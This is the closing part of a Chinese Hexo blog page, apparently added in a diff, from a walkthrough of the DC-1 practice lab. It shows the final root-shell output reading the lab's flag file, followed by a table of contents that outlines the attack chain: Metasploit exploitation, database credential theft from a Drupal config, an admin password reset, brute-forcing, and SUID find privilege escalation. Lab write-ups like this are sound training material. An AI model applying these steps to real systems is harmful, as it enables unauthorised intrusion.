+<h3 id="提权成功查看-root目录下文件"><a href="#提权成功查看-root目录下文件" class="headerlink" title="提权成功查看/root目录下文件"></a>提权成功查看/root目录下文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"># cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">//</span><br><span class="line">做得好！！！！</span><br><span class="line">希望你喜欢这个，并学到了一些新技能。</span><br><span class="line">你可以告诉我你对这次小旅行的看法</span><br><span class="line">通过Twitter联系我-@DCAU7</span><br></pre></td></tr></table></figure>
+<hr>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/01/02/2021/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-02-11 11:11:11
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="靶机记录">
+                        <b>#</b> 靶机记录
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC1-%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95"><span class="toc-text">DC1 靶机记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%9F%A5%E7%9C%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">nmap查看信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MSF-%E6%90%9C%E7%B4%A2"><span class="toc-text">使用MSF 搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8payload-0-%E5%B9%B6%E4%B8%94%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87%E5%8F%82%E6%95%B0ip"><span class="toc-text">使用payload 0 并且设置目标参数ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8Cpayload%E5%B9%B6%E4%B8%94%E5%B0%9D%E8%AF%95%E8%8E%B7%E5%8F%96shell"><span class="toc-text">成功执行payload并且尝试获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BA%86%E6%96%B9%E4%BE%BF%E4%BD%BF%E7%94%A8python%E4%BA%A4%E4%BA%92shell"><span class="toc-text">为了方便使用python交互shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-text">查看当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ls%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-text">使用ls查看当前目录信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0flag1%E5%B9%B6%E6%9F%A5%E7%9C%8B"><span class="toc-text">找到flag1并查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEflag1%E7%8C%9C%E6%B5%8Bflag2%E5%8F%AF%E8%83%BD%E4%B8%8Ecms%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3"><span class="toc-text">根据flag1猜测flag2可能与cms配置文件有关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0drupal%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%91%E7%8E%B0flag2%E4%BB%A5%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-text">查找目录发现drupal配置文件发现flag2以及数据库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEflag2%E6%8F%90%E7%A4%BA%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">根据flag2提示尝试登录数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0users%E8%A1%A8%E6%9F%A5%E7%9C%8B"><span class="toc-text">发现users表查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%E5%8A%A0%E7%9B%90%E8%A7%A3%E4%B8%8D%E5%BC%80"><span class="toc-text">发现密码加盐解不开</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E6%9F%A5%E7%9C%8B%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8cms%E8%87%AA%E5%B8%A6%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90%E5%8A%A0%E7%9B%90%E5%AF%86%E7%A0%81"><span class="toc-text">经过查看发现可以使用cms自带脚本生成加盐密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E7%94%9F%E6%88%90%E5%8A%A0%E7%9B%90%E5%AF%86%E7%A0%81%E9%87%8D%E6%96%B0%E6%9B%BF%E6%8D%A2%E4%B8%BAadmin"><span class="toc-text">将生成加盐密码重新替换为admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8admin-admin-%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99%E5%8F%91%E7%8E%B0flag3"><span class="toc-text">使用admin admin 登录网站发现flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B2%97%E7%95%A5%E7%BF%BB%E8%AF%91%E4%B8%80%E4%B8%8B%E4%B8%8B%E4%B8%80%E4%B8%AAflag%E5%8F%AF%E8%83%BD%E4%B8%8Epasswd%E6%9C%89%E5%85%B3"><span class="toc-text">粗略翻译一下下一个flag可能与passwd有关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0flag4%E7%94%A8%E6%88%B7-%E5%B0%9D%E8%AF%95%E7%88%86%E7%A0%B4"><span class="toc-text">发现flag4用户,尝试爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8flag4-orange%E7%99%BB%E5%BD%95"><span class="toc-text">使用flag4 orange登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83"><span class="toc-text">根据提示尝试提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Broot%E7%94%A8%E6%88%B7%E6%8B%A5%E6%9C%89%E7%9A%84suid%E6%96%87%E4%BB%B6"><span class="toc-text">查看root用户拥有的suid文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0find%E5%91%BD%E4%BB%A4%E6%9C%89%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-text">发现find命令有提权方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F%E6%9F%A5%E7%9C%8B-root%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%96%87%E4%BB%B6"><span class="toc-text">提权成功查看&#x2F;root目录下文件</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/17year">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
